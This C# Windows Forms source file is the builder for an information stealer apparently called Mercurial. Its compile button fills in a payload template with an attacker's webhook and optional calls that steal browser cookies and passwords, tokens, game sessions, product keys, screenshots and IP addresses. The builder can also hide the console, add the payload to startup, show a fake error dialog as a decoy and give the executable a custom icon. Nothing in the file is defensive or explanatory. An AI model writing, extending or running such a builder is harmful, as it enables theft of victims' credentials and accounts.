using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Microsoft.CSharp;
using System.CodeDom.Compiler;

namespace Mercurial
{
    public partial class Form : Form
    {
        int rgbFlag = 0;
        public Form1()
        {
            InitializeComponent();
        }

    
        [DllImport("DwmApi.dll")] 
        private static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, int[] attrValue, int attrSize);

        protected override void OnHandleCreated(EventArgs e)
        {
            try
            {
                if (DwmSetWindowAttribute(Handle, 19, new[] { 1 }, 4) != 0)
                    DwmSetWindowAttribute(Handle, 20, new[] { 1 }, 4);
            }
            catch
            {
            }
        
        }
        private void Form1_Load(object sender, EventArgs e)
        {

        }


        private void bunifuButton1_Click(object sender, EventArgs e)
        {
            // features
            bunifuPages1.SetPage("tabPage1");
        }

        private void bunifuButton3_Click(object sender, EventArgs e)
        {
            //Setup
            bunifuPages1.SetPage("tabPage2");
        }
        private void bunifuButton6_Click(object sender, EventArgs e)
        {
            //user dashboard button
            bunifuPages1.SetPage("tabPage5");
        }

        private void bunifuButton4_Click(object sender, EventArgs e)
        {
            //compiler
            bunifuPages1.SetPage("tabPage4");
        }
        private void bunifuButton5_Click(object sender, EventArgs e)
        {
            //about button
            bunifuPages1.SetPage("tabPage6");
        }

        private void bunifuVSlider1_Scroll(object sender, Utilities.BunifuSlider.BunifuVScrollBar.ScrollEventArgs e)
        {
            ActiveForm.Opacity = (double)(bunifuVSlider1.Value) / 10.0;
        }

        private void bunifuToggleSwitch1_CheckedChanged(object sender, Bunifu.UI.WinForms.BunifuToggleSwitch.CheckedChangedEventArgs e)
        {
            if (rgbFlag != 1)
            {
                bunifuColorTransition1.Stop();
                rgbFlag = 1;
            }
            
            else
            {
                bunifuColorTransition1.Continue();
                rgbFlag = 0;
            }
            
        }

        private void bunifuGroupBox15_Enter(object sender, EventArgs e)
        {

        }

        private void bunifuButton9_Click(object sender, EventArgs e)
        {
            //Compile Button

            textBox1.Text = "Attempting to compile file..";

            // .net framework dependency version
            Dictionary<string, string> providerOptions = new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } };

            CSharpCodeProvider codeProvider = new CSharpCodeProvider(providerOptions);
            ICodeCompiler icc = codeProvider.CreateCompiler();

            string output = "output.exe";

            if (!String.IsNullOrEmpty(bunifuTextBox6.Text))
            {
                output = bunifuTextBox6.Text + ".exe";
            }

            System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = output;

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Security.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");

            parameters.TreatWarningsAsErrors = false;

            if (!String.IsNullOrEmpty(bunifuTextBox4.Text))
            {
                parameters.CompilerOptions = @"/win32icon:" + "\"" + bunifuTextBox4.Text + "\"";
            }
            
            var main = Mercurial.Properties.Resources.Program;
            main = main.Replace("%INSERT_WEBHOOK%", bunifuTextBox5.Text);

            if (bunifuCheckBox8.Checked) // Roblox Session Recovery
                main = main.Replace("%CHECKBOX1%", "Roblox();");
            else
                main = main.Replace("%CHECKBOX1%", "");

            if (bunifuCheckBox7.Checked) // Minecraft Session Recovery
                main = main.Replace("%CHECKBOX2%", "Minecraft();");
            else
                main = main.Replace("%CHECKBOX2%", "");


            if (bunifuCheckBox20.Checked) // Grab Browser Cookies
                main = main.Replace("%CHECKBOX3%", "Browser.StealCookies();");
            else
                main = main.Replace("%CHECKBOX3%", "");

            if (bunifuCheckBox19.Checked) // Grab Browser Passwords
                main = main.Replace("%CHECKBOX4%", "Browser.StealPasswords();");
            else
                main = main.Replace("%CHECKBOX4%", "");

            if (bunifuCheckBox18.Checked) // Grab Windows Productr Key
                main = main.Replace("%CHECKBOX5%", "GrabProduct();");
            else
                main = main.Replace("%CHECKBOX5%", "");

            if (bunifuCheckBox17.Checked) // Grab Tokens
                main = main.Replace("%CHECKBOX11%", "GrabToken();");
            else
                main = main.Replace("%CHECKBOX11%", "");

            if (bunifuCheckBox3.Checked) // Grab Hardware
                main = main.Replace("%CHECKBOX6%", "GrabHardware();");
            else
                main = main.Replace("%CHECKBOX6%", "");

            if (bunifuCheckBox4.Checked) // Take Screenshot
                main = main.Replace("%CHECKBOX7%", "CaptureScreen();");
            else
                main = main.Replace("%CHECKBOX7%", "");

            if (bunifuCheckBox21.Checked) // Grap IP
                main = main.Replace("%CHECKBOX8%", "GrabIP();");
            else
                main = main.Replace("%CHECKBOX8%", "");

            if (bunifuCheckBox1.Checked) // Hide Console
                main = main.Replace("%CHECKBOX9%", "HideConsole();");
            else
                main = main.Replace("%CHECKBOX9%", "");

            if (bunifuCheckBox2.Checked) // Add to startup
                main = main.Replace("%CHECKBOX10%", "StartUp();");
            else
                main = main.Replace("%CHECKBOX10%", "");

            // ------------------------------------------------------------------/ 

            if (bunifuCheckBox9.Checked)
            {
                main = main.Replace("%FAKE_ERROR%", $"new Thread(() => MessageBox.Show(\"{bunifuTextBox2.Text}\", \"{bunifuTextBox1.Text}\", MessageBoxButtons.OK, MessageBoxIcon.Error)).Start();");
            }
            else
            {
                main = main.Replace("%FAKE_ERROR%", "");
            }

            if (bunifuCheckBox1.Checked)
            {
                parameters.CompilerOptions = "/t:winexe";
            }

            string[] source = new string[] {  main, Mercurial.Properties.Resources.AesGcm, Mercurial.Properties.Resources.BCrypt, Mercurial.Properties.Resources.Browser, Mercurial.Properties.Resources.Common, Mercurial.Properties.Resources.Grabber, Mercurial.Properties.Resources.Machine, Mercurial.Properties.Resources.SQLite, Mercurial.Properties.Resources.User, Mercurial.Properties.Resources.Webhook };
     
            if (!String.IsNullOrEmpty(bunifuTextBox4.Text))
            {
                parameters.CompilerOptions = @"/win32icon:" + "\"" + bunifuTextBox4.Text + "\"";
            }

            CompilerResults results = icc.CompileAssemblyFromSourceBatch(parameters, source);

            if (results.Errors.Count > 0)
            {
       
                foreach (CompilerError CompErr in results.Errors)
                {
                    textBox1.Text = textBox1.Text + Environment.NewLine +
                                CompErr.FileName + Environment.NewLine +
                                "Line number " + CompErr.Line +
                                ", Error Number: " + CompErr.ErrorNumber +
                                ", '" + CompErr.ErrorText + ";";
                }
                textBox1.Text = textBox1.Text + Environment.NewLine + "An error has occured when trying to compile file.";
            }
            else
            {
                textBox1.Text = textBox1.Text + Environment.NewLine + "Successfully compiled file!" + Environment.NewLine + "Task has been completed. You may now check the folder where this application is located for the output.";
            }

    }

        private void bunifuButton7_Click(object sender, EventArgs e)
        {
            // Webhook Button tester
            Webhook wh = new Webhook(bunifuTextBox5.Text);
            wh.Send("Webhook is working");
        }

        private void bunifuButton8_Click(object sender, EventArgs e)
        {
            // Choose icon button
            using (OpenFileDialog x = new OpenFileDialog())
            {
                x.Filter = "ico file (*.ico)|*.ico";
                if (x.ShowDialog() == DialogResult.OK)
                {
                    bunifuTextBox4.Text = x.FileName;
                    pictureBox1.ImageLocation = x.FileName;
                }
                else
                {
                    bunifuTextBox4.Clear();
                }
            }

            
        }
    }
}
